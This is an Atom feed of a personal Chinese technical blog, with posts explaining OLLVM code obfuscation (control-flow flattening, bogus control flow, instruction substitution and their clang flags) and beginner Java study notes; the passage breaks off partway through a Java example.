<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>fishjump&#39;s blog</title>
  
  <subtitle>fly,fly,fly</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-01-09T16:10:10.940Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>fishjump</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>OLLVM进阶</title>
    <link href="http://example.com/2024/01/10/OLLVM%E8%BF%9B%E9%98%B6/"/>
    <id>http://example.com/2024/01/10/OLLVM%E8%BF%9B%E9%98%B6/</id>
    <published>2024-01-09T16:10:10.000Z</published>
    <updated>2024-01-09T16:10:10.940Z</updated>
    
    <content type="html"><![CDATA[<h3 id="控制流扁平化"><a href="#控制流扁平化" class="headerlink" title="控制流扁平化"></a>控制流扁平化</h3><p>目的是展平程序的控制流程图。</p><p>测试源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">  <span class="type">int</span> a = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span>(a == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gcc编译：<img src="/2024/01/10/OLLVM%E8%BF%9B%E9%98%B6/QQ%E6%88%AA%E5%9B%BE20240110000230.png"></p><p>clang-4.0 -mllvm -fla -mllvm -split -mllvm -split_num&#x3D;3 test01.c -o test01混淆：</p><p><img src="/2024/01/10/OLLVM%E8%BF%9B%E9%98%B6/QQ%E6%88%AA%E5%9B%BE20240110000220.png"></p><p>大量的while构成的无限循环，可读性十分差<img src="/2024/01/10/OLLVM%E8%BF%9B%E9%98%B6/QQ%E6%88%AA%E5%9B%BE20240110000428.png"></p><h3 id="虚假控制流"><a href="#虚假控制流" class="headerlink" title="虚假控制流"></a>虚假控制流</h3><blockquote><p>此方法通过在当前基本块之前添加一个基本块来修改函数调用图。这个新的基本块包含一个不透明的谓词，然后有条件地跳转到原始的基本块。</p><p>原始的基本块也被克隆并填充了随机选择的垃圾指令。</p></blockquote><p><strong>不透明谓词：</strong>指的是<strong>一个表达式</strong>，它的值是确定的，但是对于分析者，程序不执行到特定位置是个很难知道真假的。静态分析器也无法推断出这个值。<img src="/2024/01/10/OLLVM%E8%BF%9B%E9%98%B6/QQ%E6%88%AA%E5%9B%BE20240109223155.png"></p><p><img src="/2024/01/10/OLLVM%E8%BF%9B%E9%98%B6/QQ%E6%88%AA%E5%9B%BE20240109223232.png"></p><p><a href="https://www.zhihu.com/question/46259412">(9 封私信 &#x2F; 80 条消息) 利用不透明谓词混淆代码的原理是什么？ - 知乎 (zhihu.com)</a></p><p>测试源代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">  <span class="type">int</span> a = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span>(a == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gcc直接编译得到：</p><p><img src="/2024/01/10/OLLVM%E8%BF%9B%E9%98%B6/QQ%E6%88%AA%E5%9B%BE20240109223351.png"></p><p>流程图：<img src="/2024/01/10/OLLVM%E8%BF%9B%E9%98%B6/QQ%E6%88%AA%E5%9B%BE20240109223415.png"></p><p>clang -mllvm -bcf选项处理编译：<img src="/2024/01/10/OLLVM%E8%BF%9B%E9%98%B6/QQ%E6%88%AA%E5%9B%BE20240109223527.png"></p><p>流程图：<img src="/2024/01/10/OLLVM%E8%BF%9B%E9%98%B6/QQ%E6%88%AA%E5%9B%BE20240109223546.png"></p><p>这里的不透明谓词是</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">( y &gt;= <span class="number">10</span> &amp;&amp; (((<span class="name">x</span> - <span class="number">1</span>) * x) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br></pre></td></tr></table></figure><p>((x - 1) * x)奇数乘偶数，得到的必然是偶数，偶数二进制形式最低位必然为0，所以不满足不等于0，&amp;&amp;的右侧表达式结果必然为假，无论y取何值，do while都不会执行第二次。</p><h3 id="指令替换"><a href="#指令替换" class="headerlink" title="指令替换"></a>指令替换</h3><p>可以实现加法、减法、和、或、异或的替换。也就是说可以把简单的运算用一种复杂的方法实现。</p><p>源码：</p><p><img src="/2024/01/10/OLLVM%E8%BF%9B%E9%98%B6/QQ%E6%88%AA%E5%9B%BE20240109171021.png"></p><p>先用gcc编译得到一个参考对照程序，就是c&#x3D;a+b</p><p><img src="/2024/01/10/OLLVM%E8%BF%9B%E9%98%B6/QQ%E6%88%AA%E5%9B%BE20240109170749.png"></p><p>经过**-sub**选项处理</p><p><img src="/2024/01/10/OLLVM%E8%BF%9B%E9%98%B6/QQ%E6%88%AA%E5%9B%BE20240109170810.png"></p><p>ecx存放5，edx存放3，esi存放0，esi&#x3D;esi-ecx （-5），ecx存放0，ecx&#x3D;ecx-edx（-3）,esi&#x3D;esi+ecx，（-8）eax&#x3D;eax-esi（8），实现的效果就是5+3–&gt;-((-5)+(-3))<img src="/2024/01/10/OLLVM%E8%BF%9B%E9%98%B6/QQ%E6%88%AA%E5%9B%BE20240109172441.png"></p><p><strong>-mllvm -sub_loop&#x3D;x</strong></p><p>使用该选项可以实现指定处理的次数x。</p><p>下一篇文章介绍如何对抗ollvm混淆。</p><p>参考：<a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Control-Flow-Flattening">Control Flow Flattening · obfuscator-llvm&#x2F;obfuscator Wiki · GitHub</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;控制流扁平化&quot;&gt;&lt;a href=&quot;#控制流扁平化&quot; class=&quot;headerlink&quot; title=&quot;控制流扁平化&quot;&gt;&lt;/a&gt;控制流扁平化&lt;/h3&gt;&lt;p&gt;目的是展平程序的控制流程图。&lt;/p&gt;
&lt;p&gt;测试源码：&lt;/p&gt;
&lt;figure class=&quot;highlig</summary>
      
    
    
    
    
    <category term="OLLVM" scheme="http://example.com/tags/OLLVM/"/>
    
  </entry>
  
  <entry>
    <title>初识OLLVM</title>
    <link href="http://example.com/2023/12/30/%E5%88%9D%E8%AF%86OLLVM/"/>
    <id>http://example.com/2023/12/30/%E5%88%9D%E8%AF%86OLLVM/</id>
    <published>2023-12-30T14:07:03.000Z</published>
    <updated>2024-01-09T08:22:46.895Z</updated>
    
    <content type="html"><![CDATA[<h3 id="OLLVM"><a href="#OLLVM" class="headerlink" title="OLLVM"></a>OLLVM</h3><p>OLLVM是一个基于LLVM的框架的混淆器，主要功能有三：指令替换、混淆控制流、控制流平坦化。一言以蔽之，ollvm可以用来混淆程序，增加逆向难度。</p><span id="more"></span><h3 id="LLVM"><a href="#LLVM" class="headerlink" title="LLVM"></a>LLVM</h3><p>那么什么是LLVM呢？LLVM（low level virtual machine）是一个编译器框架，是一系列模块化、可重用的编译器及工具链技术的集合。</p><p><img src="/2023/12/30/%E5%88%9D%E8%AF%86OLLVM/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20231230213344.png"></p><p>通过这张图，可以很好的理解llvm的作用。</p><p>第一部分：Clang作为前端接收C（各种语言）源文件，生成中间代码IR<img src="/2023/12/30/%E5%88%9D%E8%AF%86OLLVM/QQ%E6%88%AA%E5%9B%BE20231230213931.png"></p><p>第二部分：中间代码IR经pass的优化处理得到新的IR，不同的PASS对应不同的优化</p><p>第三部分：生成机器码</p><h3 id="OLLVM原理"><a href="#OLLVM原理" class="headerlink" title="OLLVM原理"></a>OLLVM原理</h3><p>费这么大篇幅介绍LLVM肯定是有用的，前面讲了OLLVM是基于LLVM，最大的区别在于PASS不同，我的理解是LLVM的pass是用来优化的，而OLLVM的PASS是用来混淆的。</p><h3 id="OLLVM的环境搭建"><a href="#OLLVM的环境搭建" class="headerlink" title="OLLVM的环境搭建"></a>OLLVM的环境搭建</h3><p>涉及到gcc、g++以及各种环境，建议直接在Ubuntu使用docker一步到位</p><p><a href="https://www.bilibili.com/read/cv13148903/">跟着铁头干混淆3 ubuntu下用docker编译ollvm(保证成功) - 哔哩哔哩 (bilibili.com)</a></p><h3 id="OLLVM的使用"><a href="#OLLVM的使用" class="headerlink" title="OLLVM的使用"></a>OLLVM的使用</h3><h4 id="控制流平坦化"><a href="#控制流平坦化" class="headerlink" title="控制流平坦化"></a>控制流平坦化</h4><p>可用选项：</p><ul><li>-mllvm -fla : 激活控制流平坦化</li><li>-mllvm -split : 激活基本块分割</li><li>-mllvm -split_num&#x3D;3 : 指定基本块分割的数目</li></ul><p>语法</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang 选项一 选项二 选项<span class="built_in">N</span> 原码 -o 可执行文件</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clang -mllvm -fla test.c -o test</span><br></pre></td></tr></table></figure><h4 id="虚假控制流"><a href="#虚假控制流" class="headerlink" title="虚假控制流"></a>虚假控制流</h4><p>可用选项：</p><ul><li>-mllvm -bcf : 激活虚假控制流</li><li>-mllvm -bcf_loop&#x3D;3 : 混淆次数，这里一个函数会被混淆3次，默认为 1</li><li>-mllvm -bcf_prob&#x3D;40 : 每个基本块被混淆的概率，这里每个基本块被混淆的概率为40%，默认为 30 %</li></ul><p>语法同上</p><h4 id="指令替换"><a href="#指令替换" class="headerlink" title="指令替换"></a>指令替换</h4><p>可用选项：</p><ul><li>-mllvm -sub : 激活指令替代</li><li>-mllvm -sub_loop&#x3D;3 : 混淆次数，这里一个函数会被混淆3次，默认为 1次</li></ul><p>语法同上</p><p>下一篇文章介绍各个混淆实现的效果。</p><p>参考链接：</p><p><a href="https://jev0n.com/2022/07/07/ollvm-0.html">OLLVM混淆学习（0）——环境搭建及混淆初体验 - 思泉 | Jev0n</a></p><p><a href="https://www.cnblogs.com/lqerio/p/16009042.html#Clang">LLVM 简介 （一） - Erio - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;OLLVM&quot;&gt;&lt;a href=&quot;#OLLVM&quot; class=&quot;headerlink&quot; title=&quot;OLLVM&quot;&gt;&lt;/a&gt;OLLVM&lt;/h3&gt;&lt;p&gt;OLLVM是一个基于LLVM的框架的混淆器，主要功能有三：指令替换、混淆控制流、控制流平坦化。一言以蔽之，ollvm可以用来混淆程序，增加逆向难度。&lt;/p&gt;</summary>
    
    
    
    
    <category term="OLLVM" scheme="http://example.com/tags/OLLVM/"/>
    
  </entry>
  
  <entry>
    <title>Java疑难杂症</title>
    <link href="http://example.com/2023/11/19/Java%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/"/>
    <id>http://example.com/2023/11/19/Java%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/</id>
    <published>2023-11-19T13:48:04.000Z</published>
    <updated>2023-11-20T06:16:18.528Z</updated>
    
    <content type="html"><![CDATA[<p>跟着GitHub上的 27天成为java大神 项目学习Java。</p><h3 id="损失精度"><a href="#损失精度" class="headerlink" title="损失精度"></a>损失精度</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">面试题：</span><br><span class="line"><span class="type">short</span> s=<span class="number">1</span>, s = s+<span class="number">1</span>; </span><br><span class="line"></span><br><span class="line">        <span class="type">short</span> s=<span class="number">1</span>, s+=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">上面两个代码有没有问题，如果有，那里有问题</span><br></pre></td></tr></table></figure><span id="more"></span><p>第一个是存在问题的，java默认类型是int， <code>s = s+1</code>里的1就是int类型的，所以等号右边的s+1会被转化成int类型，而一个int类型的值要赋值给short类型的变量，就会报错。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">      s += <span class="number">1</span>; </span><br><span class="line"><span class="comment">//这个是没有问题的。</span></span><br><span class="line"><span class="comment">//因为这个式子等价于：</span></span><br><span class="line"><span class="comment">// s = (s的数据类型)(s + 1);</span></span><br></pre></td></tr></table></figure><h3 id="逻辑右移与算数右移"><a href="#逻辑右移与算数右移" class="headerlink" title="逻辑右移与算数右移"></a>逻辑右移与算数右移</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;    <span class="comment">//算数右移，最高位补符号位</span></span><br><span class="line">&gt;&gt;&gt;   <span class="comment">//逻辑右移，最后高位补零</span></span><br><span class="line">此处的-<span class="number">1</span>为<span class="type">int</span>类型，<span class="number">32</span>位    </span><br><span class="line">-<span class="number">1</span>&gt;&gt;<span class="number">1</span> =<span class="number">1111</span> <span class="number">1111</span> = -<span class="number">1</span></span><br><span class="line">-<span class="number">1</span>&gt;&gt;&gt;<span class="number">1</span>=<span class="number">0111</span> <span class="number">1111</span> = <span class="number">2147483647</span> max</span><br></pre></td></tr></table></figure><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">1</span> 原码：<span class="number">1000 0001</span></span><br><span class="line">   反码：<span class="number">1111 1110</span></span><br><span class="line">   补码：<span class="number">1111 1111</span>     </span><br></pre></td></tr></table></figure><h3 id="打印数组名"><a href="#打印数组名" class="headerlink" title="打印数组名"></a>打印数组名</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">System.out.println(arr);      <span class="comment">//[I@2f92e0f4</span></span><br><span class="line"></span><br><span class="line">System.out.println(arr[<span class="number">0</span>]);   <span class="comment">//0</span></span><br><span class="line">System.out.println(arr[<span class="number">1</span>]);   <span class="comment">//0</span></span><br><span class="line">System.out.println(arr[<span class="number">2</span>]);   <span class="comment">//0</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>未初始化的数组被编译器初始化为0，打印arr出现字符串**[I@2f92e0f4**其中 [ 代表该数据为数组，I 代表数据类型是int，后面的是地址。</p><p>特殊的，如果打印的是一个char数组命，则会直接打印出数组内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">test01</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>[] arr=<span class="keyword">new</span> <span class="title class_">char</span>[]&#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">System.out.println(arr);          <span class="comment">//abc</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是因为方法的重载，public void println(char[] x) 是直接打印出内容，其余几个类型是打印地址。</p><h3 id="java中只有值传递"><a href="#java中只有值传递" class="headerlink" title="java中只有值传递"></a>java中只有值传递</h3><p>如果想通过方法修改数组可以传递地址，也就是数组名。</p><h3 id="this的本质"><a href="#this的本质" class="headerlink" title="this的本质"></a>this的本质</h3><p>this的本质：代表方法<strong>调用者</strong>的<strong>地址值</strong></p><h3 id="float与long"><a href="#float与long" class="headerlink" title="float与long"></a>float与long</h3><p>long类型的数据后面要加上L或l，float类ing的数据后面要加上f或F，因为整数类型默认是int，浮点类型默认是double。</p><h3 id="Java中的内存分配"><a href="#Java中的内存分配" class="headerlink" title="Java中的内存分配"></a>Java中的内存分配</h3><p>程序在运行时需要在内存分配空间为了提高效率，对空间进行了划分。</p><ul><li>栈 存储局部变量</li><li>堆  存储new出来的东西</li><li>方法区</li><li>本地方法区</li><li>寄存器</li></ul><h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><p>Java中的静态关键字，类中的<strong>变量</strong>&#x2F;<strong>方法</strong>被static修饰，则可以被所有对象<strong>共享</strong>。并且被static修饰的成员可以直接通过类名进行调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        system.out.println(<span class="string">&quot;hahahah&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        Students s=<span class="keyword">new</span> <span class="title class_">Students</span>();</span><br><span class="line">        s.show();</span><br><span class="line">        <span class="comment">//直接通过类名调用</span></span><br><span class="line">        Student.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在静态方法中没有this关键字，因为静态是<strong>随着类的加载而加载的</strong>（存放在堆中的静态区），优先于对象进入内存，而this是随着对象进入内存的，先进内存的不能访问后进内存的，而后进入内存的可以访问先进入内存的。</p><p><strong>静态只能访问静态</strong>，静态的成员方法只能访问静态成员变量和静态的成员方法，非静态的成员方法则可以访问所有。</p><h3 id="变量的就近原则"><a href="#变量的就近原则" class="headerlink" title="变量的就近原则"></a>变量的就近原则</h3><p>使用变量的时候会优先找局部范围，如果想直接使用成员变量可以使用this关键字。及承建的成员变量也符合这个规则，如果想使用父类的成员变量可以使用super关键字。</p><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>子类会默认调用父类的无参构造方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ExtendDemo</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">666</span>;</span><br><span class="line">    Zi z=<span class="keyword">new</span> <span class="title class_">Zi</span>(<span class="number">666</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Fu</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Fu</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;father&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Fu</span><span class="params">(<span class="type">int</span> a)</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Zi</span> <span class="keyword">extends</span> <span class="title class_">Fu</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Zi</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line">     System.out.println(a);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码的输出是什么？是666吗，不，是father 666，这是为什么呢？？？？因为在调用子类的构造方法输出666之前先调用了父类的无参构造方法，要想只输出666有两种方法，<strong>第一种</strong>是清空父类的所有构造方法，如下</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="symbol">Fu</span>&#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样父类会有一个默认的Fu{},没有影响，特别注意的是就算Fu类定义成下面这个样子也是不行的，因为编译器检测到存在构造方法，就不会自动添加一个无参构造方法，这样子类在调用父类的构造方法时就会出错。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Fu</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Fu</span><span class="params">(<span class="type">int</span> a)</span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二种是使用super关键字</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Fu</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Fu</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;father&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Fu</span><span class="params">(<span class="type">int</span> a)</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Zi</span> <span class="keyword">extends</span> <span class="title class_">Fu</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="title function_">Zi</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line">     <span class="built_in">super</span>(a);</span><br><span class="line">     System.out.println(a);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>super(…)关键字可以访问父类的带参构造方法，this(…)访问本类的构造方法。</p><h3 id="方法重载与方法重写"><a href="#方法重载与方法重写" class="headerlink" title="方法重载与方法重写"></a>方法重载与方法重写</h3><p><strong>方法重写 override</strong> 发生在子类与父类之间，当子类与父类方法声明相同时就发生了方法重写，返回值类型、参数列表不可改变。</p><p>**方法重载 overload ** 发生在同一个类中，当方法名相同但是参数列表不相同时就发生了重载，重载可以使用不同的返回值类型。</p><h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><p>多态可以理解为一个事物的多种形态，比如水，有固体水、液体水、气体水，可以定义一个水类，固液气采用继承的方式来创建新的类，这样既有了水的共性，又有各自的特性。我上面的表达不就是继承吗？哈，这样说似乎也没什么问题，多态的三个必要条件就是：继承、方法重写、<strong>父类指向子类对象。</strong>继承是多态的前提。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父类指向子类对象</span></span><br><span class="line">Father fa= <span class="keyword">new</span> <span class="title class_">Son</span>();</span><br></pre></td></tr></table></figure><p>对于多态<strong>成员变量</strong>：编译、运行看左边</p><p>看左边指的就是左边的 fa</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Father</span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> age=<span class="number">44</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Son</span> <span class="keyword">extends</span> <span class="title class_">Father</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age=<span class="number">22</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Demo&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="comment">//父类类型 对象 = new 子类类型 ()</span></span><br><span class="line">        Father fa=<span class="keyword">new</span> <span class="title class_">Son</span>();</span><br><span class="line">        System.out.println(fa.age); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果,也就是左边的Father类中的age</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">44</span><br></pre></td></tr></table></figure><p>对于多态<strong>成员方法</strong>：编译看左边，运行看右边。</p><p>这里的编译，也就是在运行前，我们写出来，编译器就会检测，如果有错误就不能运行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Father</span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;爸爸吃饭&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//子类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Son</span> <span class="keyword">extends</span> <span class="title class_">Father</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;儿子吃饭&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">play</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;儿子玩游戏&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Demo&#123;</span><br><span class="line"> 